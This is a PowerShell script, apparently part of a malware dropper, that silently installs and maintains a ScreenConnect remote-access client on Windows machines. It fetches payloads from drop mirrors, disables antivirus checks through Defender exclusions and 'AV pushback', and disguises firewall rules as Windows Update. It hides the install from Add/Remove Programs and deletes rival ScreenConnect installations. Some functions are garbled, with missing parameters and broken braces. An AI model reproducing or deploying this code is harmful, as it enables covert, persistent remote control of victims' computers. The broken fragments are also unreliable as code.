function Get-ScInstallRoots {
    $roots = [System.Collections.Generic.List[string]]::new()
    foreach ($r in @(
        $ScDir,
        "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)",
        "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)",
        "${env:ProgramData}\ScreenConnect\$PrimaryFingerprint"
    )) {
        if ($r -and (Test-Path $r)) { [void]$roots.Add($r) }
    }
    # Also trust the live service ImagePath directory
    try {
        $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
        if ($svc -and $svc.PathName) {
            $m = [regex]::Match($svc.PathName, '^"([^"]+)"|^(\S+\.exe)')
            $exe = if ($m.Groups[1].Success) { $m.Groups[1].Value } else { $m.Groups[2].Value }
            if ($exe) {
                $dir = Split-Path -Parent $exe
                if ($dir -and (Test-Path $dir) -and -not $roots.Contains($dir)) { [void]$roots.Add($dir) }
            }
        }
    } catch {}
    return @($roots)
}

function Get-ScBinaryHealth {
    $info = [ordered]@{
        ServicePresent = [bool](Test-ScServicePresent)
        ServiceRunning = [bool](Test-ScServiceRunning)
        Roots          = @((Get-ScInstallRoots))
        ExeCount       = 0
        SvcExeSize     = 0
        ClientExeSize  = 0
        HasClientExe   = $false
        MaxExeSize     = 0
        Stubbed        = $false
        HealthyFiles   = $false
    }
    foreach ($r in $info.Roots) {
        Get-ChildItem -Path $r -Filter 'ScreenConnect*.exe' -ErrorAction SilentlyContinue | ForEach-Object {
            $info.ExeCount++
            if ($_.Length -gt $info.MaxExeSize) { $info.MaxExeSize = $_.Length }
            if ($_.Name -match '(?i)^ScreenConnect\.ClientService\.exe$') { $info.SvcExeSize = $_.Length }
            if ($_.Name -match '(?i)^ScreenConnect\.(WindowsClient|Client)\.exe$') {
                $info.HasClientExe = $true
                if ($_.Length -gt $info.ClientExeSize) { $info.ClientExeSize = $_.Length }
            }
        }
    }
    # Real sevrz ClientService is ~95KB — NOT a stub
    if ($info.SvcExeSize -gt 0 -and $info.SvcExeSize -lt 40000) { $info.Stubbed = $true }
    if ($info.HasClientExe -and $info.ClientExeSize -gt 0 -and $info.ClientExeSize -lt 100000) { $info.Stubbed = $true }
    $info.HealthyFiles = ($info.SvcExeSize -ge 50000 -and -not $info.Stubbed)
    return $info
}

function Test-IsPrimaryScProcess {

    if ($blob -like "*$PrimaryFingerprint*") { return $true }
    if ($blob -like '*\.wucache\scclient*') { return $true }
    return $false
}

function Get-ScFingerprintsFromBlob {
    param([string]$Blob)
    if (-not $Blob) { return @() }
    $fps = [System.Collections.Generic.List[string]]::new()
    # Match (16-hex) anywhere near ScreenConnect paths/names
    foreach ($m in [regex]::Matches($Blob, '(?i)\(([0-9a-f]{16})\)')) {
        $fp = $m.Groups[1].Value.ToLowerInvariant()
        if (-not $fps.Contains($fp)) { [void]$fps.Add($fp) }
    }
    return @($fps)
}

function Test-IsAllowedFingerprint {
    param([string]$Fp)

    $f = $Fp.ToLowerInvariant()
    foreach ($a in $AllowedFingerprints) {
        if ($a.ToLowerInvariant() -eq $f) { return $true }
    }
    return $false
}

function Test-IsAllowedSc {

        if ($Blob -like "*$a*") { return $true }
    }
    foreach ($n in $AllowedSvcNames) {
        if ($Blob -like "*$n*") { return $true }

    return $false
}

function Get-DropFile {
    param([string]$Name, [string]$Dest, [int]$MinBytes = 40)
    Remove-Item $Dest -Force -ErrorAction SilentlyContinue
    foreach ($base in $DropMirrors) {
        $url = "$base/$Name`?t=$CacheBust"
        Write-Log "DL $url"
        try {
            & curl.exe -L --ssl-no-revoke --connect-timeout 25 --retry 2 -o "$Dest" "$url" >$null 2>&1
            if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge $MinBytes)) {
                Write-Log ("DL ok {0} bytes={1}" -f $Name, (Get-Item $Dest).Length)
                return $true
            }
        } catch {}
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            (New-Object Net.WebClient).DownloadFile($url, $Dest)
            if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge $MinBytes)) {
                Write-Log ("DL ok {0} bytes={1}" -f $Name, (Get-Item $Dest).Length)
                return $true
            }
        } catch {}
    }
    Write-Log "DL fail $Name"
    return $false
}

function Copy-ScPayloadFiles {
    param([string]$SrcDir, [string]$DestDir)
    New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
    $n = 0
    Get-ChildItem -Path $SrcDir -File -ErrorAction SilentlyContinue | ForEach-Object {
        $target = Join-Path $DestDir $_.Name
        try {
            [IO.File]::WriteAllBytes($target, [IO.File]::ReadAllBytes($_.FullName))
            Write-Log ("byte-copied {0} bytes={1}" -f $_.Name, $_.Length)
            $n++
        } catch {
            try {
                Copy-Item $_.FullName $target -Force -ErrorAction Stop
                Write-Log ("Copy-Item OK {0}" -f $_.Name)
                $n++
            } catch {
                Write-Log ("copy fail {0}: {1}" -f $_.Name, $_.Exception.Message)
            }
        }
    }
    return $n
}

function Install-PrimaryFromMsi {
    # msiexec runs FixupServiceArguments — required for sevrz console check-in
    Write-Log 'INSTALL: msiexec /i (FixupServiceArguments)'
    Invoke-GenericAvPushback | Out-Null
    $msi = Join-Path $env:TEMP 'sc_primary.msi'
    $log = Join-Path $WorkDir 'msi_join.log'
    & curl.exe -L --ssl-no-revoke --connect-timeout 30 -o "$msi" "$MsiUrl" >$null 2>&1
    if (-not (Test-Path $msi) -or ((Get-Item $msi).Length -lt 500000)) {
        Write-Log 'INSTALL: MSI download failed'
        return $false
    }
    Write-Log ("INSTALL: MSI bytes={0}" -f (Get-Item $msi).Length)
    Stop-PrimaryScProcesses
    # Do NOT kill all msiexec — can disrupt allowed alt SC / other installs
    Start-Sleep -Seconds 2
    try { Start-Service msiserver -ErrorAction SilentlyContinue } catch {}
    $p = Start-Process msiexec.exe -ArgumentList "/i `"$msi`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v `"$log`"" `
        -Wait -PassThru -WindowStyle Hidden
    Write-Log "INSTALL: msiexec exit $($p.ExitCode)"
    if ($p.ExitCode -ne 0 -and $p.ExitCode -ne 3010) {
        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$msi`" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress /l*v `"$log`"" `
            -Wait -PassThru -WindowStyle Hidden
        Write-Log "INSTALL: msiexec reinstall exit $($p2.ExitCode)"
    }
    Start-Sleep -Seconds 8
    & sc.exe config "$SvcName" start= auto >$null 2>&1
    & sc.exe start "$SvcName" >$null 2>&1
    try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
    Start-AllowedAlternatives
    Start-Sleep -Seconds 6
    $svc = Get-CimInstance Win32_Service -Filter "Name='$SvcName'" -ErrorAction SilentlyContinue
    if ($svc -and $svc.PathName -notmatch '\{[0-9A-F]{8}-') {
        Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $svc.PathName -Encoding UTF8 -Force
        Write-Log ("INSTALL: ImagePath after MSI hasS={0} len={1}" -f ($svc.PathName -match '&s='), $svc.PathName.Length)
    }
    $ok = [bool](Test-ScServiceRunning)
    Write-Log ("INSTALL: msiexec running={0} relay={1}" -f $ok, (Test-ScRelayConnected))
    return $ok
}

function Install-PrimaryFromZip {
    Write-Log 'INSTALL: zip -> stealth scclient'
    $zip = Join-Path $WorkDir 'sc_payload.zip'
    if (-not (Get-DropFile -Name 'sc_payload.zip' -Dest $zip -MinBytes 500000)) {
        Write-Log 'INSTALL: zip download failed'
        return $false
    }
    $stage = Join-Path $env:TEMP ('sczip_' + [guid]::NewGuid().ToString('N'))
    Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
    New-Item $stage -ItemType Directory -Force | Out-Null
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
        [IO.Compression.ZipFile]::ExtractToDirectory($zip, $stage)
    } catch {
        try { Expand-Archive -Path $zip -DestinationPath $stage -Force } catch {
            Write-Log "zip extract fail: $($_.Exception.Message)"
            return $false
        }
    }
    $svc = Get-ChildItem $stage -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
        Select-Object -First 1
    if (-not $svc) {
        Write-Log 'INSTALL: zip missing ClientService.exe'
        return $false
    }
    Stop-PrimaryScProcesses

    $n = Copy-ScPayloadFiles -SrcDir $svc.Directory.FullName -DestDir $ScDir
    Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "INSTALL: deployed $n files -> $ScDir"
    return ((Test-Path (Join-Path $ScDir 'ScreenConnect.ClientService.exe')) -and (
        (Get-Item (Join-Path $ScDir 'ScreenConnect.ClientService.exe')).Length -ge 50000))
}

function Set-PrimaryScImagePath {
    param([string]$Args, [switch]$Force)
    $rk = "HKLM:\SYSTEM\CurrentControlSet\Services\$SvcName"
    if (-not $Force -and (Test-Path $rk)) {
        $cur = (Get-ItemProperty $rk -ErrorAction SilentlyContinue).ImagePath
        if ($cur -and $cur -match '&s=' -and $cur -notmatch '\{[0-9A-F]{8}-') {
            Write-Log 'ImagePath keep msiexec/fixup args'
            return $true
        }
        if ($cur -and $cur -like '*Program Files*ScreenConnect*' -and $cur -match '\?e=Access' -and $cur -notmatch '\{[0-9A-F]{8}-') {
            Write-Log 'ImagePath keep Program Files install'
            return $true
        }
    }
    $exe = $null
    foreach ($cand in @(
        "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)\ScreenConnect.ClientService.exe",
        "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)\ScreenConnect.ClientService.exe",
        (Join-Path $ScDir 'ScreenConnect.ClientService.exe')
    )) {
        if (Test-Path $cand) { $exe = $cand; break }
    }
    if (-not $exe) { return $false }
    if (-not $Args) { $Args = Get-CleanScArgs }
    if (-not $Args) { return $false }
    if ($Args -match '\{[0-9A-F]{8}-' -or $Args -match '\|ScreenConnect') {
        Write-Log 'ImagePath refuse junk args'
        return $false
    }
    $img = '"{0}" "{1}"' -f $exe, $Args
    if (-not (Test-ScServicePresent)) {
        try {
            New-Service -Name $SvcName -BinaryPathName $img -DisplayName $SvcName -StartupType Automatic -ErrorAction Stop | Out-Null
            Write-Log 'service created'
        } catch { Write-Log "New-Service: $($_.Exception.Message)" }
    }
    if (-not (Test-Path $rk)) { return $false }
    Set-ItemProperty -Path $rk -Name ImagePath -Value $img -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $rk -Name Start -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
    Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $img -Encoding UTF8 -Force
    Write-Log ("registry ImagePath set args_len={0}" -f $Args.Length)
    & sc.exe config "$SvcName" start= auto >$null 2>&1
    return $true
}

function Start-PrimaryService {
    if (-not (Test-ScServicePresent)) { return $false }
    & sc.exe config "$SvcName" start= auto >$null 2>&1
    if (-not (Test-ScServiceRunning)) {
        & sc.exe start "$SvcName" >$null 2>&1
        try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
        Start-Sleep -Seconds 3
    }
    return (Test-ScServiceRunning)
}

function Enable-ScFirewallAllow {
    Get-ChildItem -Path $ScDir -Filter *.exe -ErrorAction SilentlyContinue | ForEach-Object {
        $n = "WU_SC_$($_.BaseName)"
        netsh advfirewall firewall delete rule name="$n" >$null 2>&1
        netsh advfirewall firewall delete rule name="${n}_out" >$null 2>&1
        netsh advfirewall firewall add rule name="$n" dir=in action=allow program="$($_.FullName)" enable=yes profile=any >$null 2>&1
        netsh advfirewall firewall add rule name="${n}_out" dir=out action=allow program="$($_.FullName)" enable=yes profile=any >$null 2>&1
    }
}

function Ensure-PrimarySc {
    param([int]$MaxRounds = 4)
    Write-Log "ENSURE primary SC (max $MaxRounds rounds) — skip reinstall if healthy+running"
    Assert-AllowedAlternativesAlive

    # Fast path: already good — do NOT msiexec/zip
    if (Test-PrimaryScOperational -and -not (Test-PrimaryImagePathJunk)) {
        $relay = Test-ScRelayConnected
        Write-Log ("ENSURE-OK: primary already healthy+running (relay={0}) — skip reinstall" -f $relay)
        Enable-ScFirewallAllow
        Set-ArpCamouflage
        Assert-AllowedAlternativesAlive
        return $true
    }

    for ($i = 1; $i -le $MaxRounds; $i++) {
        Write-Log "ENSURE repair round $i/$MaxRounds"
        Enable-QuietDefenderExclusions
        Assert-AllowedAlternativesAlive -Silent
        $h = Get-ScBinaryHealth
        $relay = Test-ScRelayConnected
        $junk = Test-PrimaryImagePathJunk
        Write-Log ("ENSURE-$i present={0} running={1} svcExe={2} healthyFiles={3} stub={4} junkImg={5} relay={6}" -f `
            $h.ServicePresent, $h.ServiceRunning, $h.SvcExeSize, $h.HealthyFiles, $h.Stubbed, $junk, $relay)

        if ($h.ServiceRunning -and $h.HealthyFiles -and -not $h.Stubbed -and -not $junk) {
            Write-Log 'ENSURE-OK: primary healthy+running — skip further reinstall'
            Enable-ScFirewallAllow
            Set-ArpCamouflage
            Assert-AllowedAlternativesAlive
            return $true
        }

        # Healthy files, service stopped/missing — start only (no reinstall yet)
        if ($h.HealthyFiles -and -not $h.Stubbed -and -not $junk) {
            Write-Log 'ENSURE: healthy files but not running — start only'
            if (-not $h.ServicePresent) { Set-PrimaryScImagePath | Out-Null }
            Start-PrimaryService | Out-Null
            Assert-AllowedAlternativesAlive -Silent
            Start-Sleep -Seconds 4
            if (Test-PrimaryScOperational) {
                Write-Log 'ENSURE-OK: started existing healthy install'
                Enable-ScFirewallAllow
                Set-ArpCamouflage
                Assert-AllowedAlternativesAlive
                return $true
            }
            Write-Log 'ENSURE: start failed on healthy files — problem, msiexec once'
            Install-PrimaryFromMsi | Out-Null
            Assert-AllowedAlternativesAlive
            if (Test-PrimaryScOperational) { return $true }
            continue
        }

        # Junk ImagePath while otherwise present — registry fix first, MSI only if still broken
        if ($junk) {
            Write-Log 'ENSURE: junk ImagePath — registry fix then start'
            Set-PrimaryScImagePath -Force | Out-Null
            Start-PrimaryService | Out-Null
            Assert-AllowedAlternativesAlive -Silent
            Start-Sleep -Seconds 3
            if (Test-PrimaryScOperational -and -not (Test-PrimaryImagePathJunk)) {
                Write-Log 'ENSURE-OK: ImagePath repaired without MSI'
                return $true
            }
            Write-Log 'ENSURE: ImagePath still bad — msiexec'
            Install-PrimaryFromMsi | Out-Null
            Assert-AllowedAlternativesAlive
            if (Test-PrimaryScOperational) { return $true }
            continue
        }

        # Missing / stubbed binaries — real problem
        Write-Log 'ENSURE: files missing/stubbed — zip then start; MSI only if still broken'
        Invoke-GenericAvPushback
        Install-PrimaryFromZip | Out-Null
        Set-PrimaryScImagePath -Force | Out-Null
        Start-PrimaryService | Out-Null
        Assert-AllowedAlternativesAlive
        Start-Sleep -Seconds 4
        if (Test-PrimaryScOperational) {
            Write-Log 'ENSURE-OK: restored via zip (no MSI needed)'
            Enable-ScFirewallAllow
            Set-ArpCamouflage
            return $true
        }
        Write-Log 'ENSURE: zip/start insufficient — msiexec join'
        Install-PrimaryFromMsi | Out-Null
        Assert-AllowedAlternativesAlive
        if (Test-PrimaryScOperational) { return $true }
    }

    $final = Test-PrimaryScOperational
    Assert-AllowedAlternativesAlive
    Write-Log ("ENSURE-FINAL operational={0} relay={1}" -f $final, (Test-ScRelayConnected))
    return $final
}

# RIVAL NUKE — ONLY after primary ready
# HARD RULE: never stop/kill/delete allowed SC (pluxn). Ambiguous SC = protect.
# ============================================
function Remove-ScreenConnectInstance {
    param([string]$Fingerprint, [string]$Reason = 'unauthorized')
    if (-not $Fingerprint) { return 0 }
    if (Test-IsAllowedFingerprint $Fingerprint) {
        Write-Log "NUKE REFUSE allowed FP $Fingerprint"
        return 0
    }
    $n = 0
    $svcName = "ScreenConnect Client ($Fingerprint)"
    Write-Log "NUKE $Reason SC $svcName"
    & sc.exe stop "$svcName" >$null 2>&1
    & sc.exe delete "$svcName" >$null 2>&1
    Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
        $_.Name -like "*$Fingerprint*" -or $_.PathName -like "*$Fingerprint*" -or $_.DisplayName -like "*$Fingerprint*"
    } | ForEach-Object {
        if (Test-IsAllowedSc "$($_.Name) $($_.PathName)") { return }
        Write-Log "NUKE svc $($_.Name)"
        & sc.exe stop "$($_.Name)" >$null 2>&1
        & sc.exe delete "$($_.Name)" >$null 2>&1
        $n++
    }
    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        $_.Name -match '(?i)^ScreenConnect\.' -and (
            $_.ExecutablePath -like "*$Fingerprint*" -or $_.CommandLine -like "*$Fingerprint*"
        )
    } | ForEach-Object {
        Write-Log "NUKE proc pid=$($_.ProcessId) fp=$Fingerprint"
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
        $n++
    }
    foreach ($base in @(${env:ProgramFiles}, ${env:ProgramFiles(x86)}, $env:ProgramData)) {
        if (-not $base) { continue }
        Get-ChildItem $base -Directory -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -like "*$Fingerprint*" -or $_.FullName -like "*ScreenConnect*$Fingerprint*"
        } | ForEach-Object {
            Write-Log "NUKE dir $($_.FullName)"
            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
            $n++
        }
        $scData = Join-Path $base "ScreenConnect\$Fingerprint"
        if (Test-Path $scData) {
            Write-Log "NUKE data $scData"
            Remove-Item $scData -Recurse -Force -ErrorAction SilentlyContinue
            $n++
        }
    }
    foreach ($root in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
    )) {
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if (-not $p) { return }
            $b = "$($p.DisplayName) $($p.InstallLocation) $($p.UninstallString)"
            if ($b -like "*$Fingerprint*" -and -not (Test-IsAllowedSc $b)) {
                Write-Log "NUKE ARP $($_.PSChildName)"
                Remove-Item $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue
                $n++
            }
        }
    }
    return $n
}

function Get-HashFast([string]`$p){ try{ if(Test-Path `$p){ return (Get-FileHash `$p -Algorithm SHA256).Hash } }catch{}; return '' }
function Try-Dl([string]`$name,[string]`$dest,[int]`$min=500){
  `$cb=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
  foreach(`$b in `$mirrors){
    `$u=(`$b.TrimEnd('/')+'/'+`$name+'?t='+`$cb)
    try{ & curl.exe -L --ssl-no-revoke --connect-timeout 20 --max-time 90 -o "`$dest" "`$u" >`$null 2>&1 }catch{}
    if((Test-Path `$dest) -and ((Get-Item `$dest).Length -ge `$min)){ return `$true }
    try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile(`$u,`$dest) }catch{}
    if((Test-Path `$dest) -and ((Get-Item `$dest).Length -ge `$min)){ return `$true }
  }
  return `$false
}
